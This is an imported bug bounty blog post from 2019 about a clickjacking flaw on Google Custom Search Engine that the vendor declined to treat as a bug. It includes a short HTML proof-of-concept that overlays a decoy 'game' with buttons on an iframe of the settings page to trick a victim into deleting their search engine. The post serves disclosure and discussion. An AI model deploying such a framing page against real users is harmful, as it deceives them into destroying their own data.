---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-02-10_i-found-clickjacking-on-google-cse-is-this-important.md
original_filename: 2019-02-10_i-found-clickjacking-on-google-cse-is-this-important.md
title: I Found Clickjacking on Google CSE. Is This Important?
category: documents
detected_topics:
- command-injection
- clickjacking
- api-security
tags:
- imported
- documents
- command-injection
- clickjacking
- api-security
language: en
raw_sha256: 270224baa54b5aa28e359d360df184b7b4b453a1e8b48baf374344ef9326b3ea
text_sha256: eee1c049db5e88260c5e1c8edc30d2e3ee42c9e349e9fb5e353538287a8d5bc6
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# I Found Clickjacking on Google CSE. Is This Important?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-02-10_i-found-clickjacking-on-google-cse-is-this-important.md
- Source Type: markdown
- Detected Topics: command-injection, clickjacking, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `270224baa54b5aa28e359d360df184b7b4b453a1e8b48baf374344ef9326b3ea`
- Text SHA256: `eee1c049db5e88260c5e1c8edc30d2e3ee42c9e349e9fb5e353538287a8d5bc6`


## Content

---
title: "I Found Clickjacking on Google CSE. Is This Important?"
url: "https://medium.com/@abaykandotcom/clickjacking-on-google-cse-6636bba72d20"
authors: ["Mukhammad Akbar (@abaykandotcom)"]
programs: ["Google"]
bugs: ["Clickjacking"]
publication_date: "2019-02-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5421
scraped_via: "browseros"
---

# I Found Clickjacking on Google CSE. Is This Important?

1

I Found Clickjacking on Google CSE. Is This Important?
abay - Akbar Kustirama
Follow
2 min read
·
Feb 10, 2019

12

1

While i was testing i found that cse.google.com is vulnerable to clickjacking so i checked if the settings page is vulnerable or not and it was vulnerable so now this has a risk! The attacker could delete someone’s CSE.

Press enter or click to view image in full size

Summary: Attacker can delete victim’s CSE.

Steps to reproduce:

Go to https://cse.google.com/
It can be embedded into any webpage.
Attacker may manipulate HTML template so it can delete victim’s CSE.

I wrote an exploit code for clickjacking and here is the exploit code:

<center>
<div style="position: absolute; left: 100px; top: 10px;"><h3>Let's consider this is a game!</h3></div>
<div style="position: absolute; left: 100px; top: 40px;"><h3>To finish it, you have to press the keys in sequence.</h3></div>
<div style="position: absolute; left: 205px; top: 278px; color: red;"><button>1</button></div>
<div style="position: absolute; left: 300px; top: 178px; color: red;"><button>2</button></div>
<div style="position: absolute; left: 400px; top: 475px; color: red;"><button>3</button></div>
<iframe style="opacity: 1; border: 0; position: fixed; top: 0px; left: 0px;" src="https://cse.google.com/" width="100%" height="100%"></iframe>

By using Clickjacking technique, an attacker can make someone unconsciously delete their CSE.

Get abay - Akbar Kustirama’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

About how attacker can make someone unconsciously delete their CSE, you can check my video POC here:

Enough about the explanation.

Okay, the problem has just begun. My findings above, in my opinion are valid bugs. Why? Because the attacker can delete someone’s data (CSE), isn’t this a bug? But the response I got was very surprising.

Press enter or click to view image in full size
Press enter or click to view image in full size

The part that makes me confused is, how is this not a bug? Because in my head it is clear that I can delete other people’s data.

What do you think? Is this a bug? Or is it just me who overestimates this as a bug?

This article already published in dev.to.
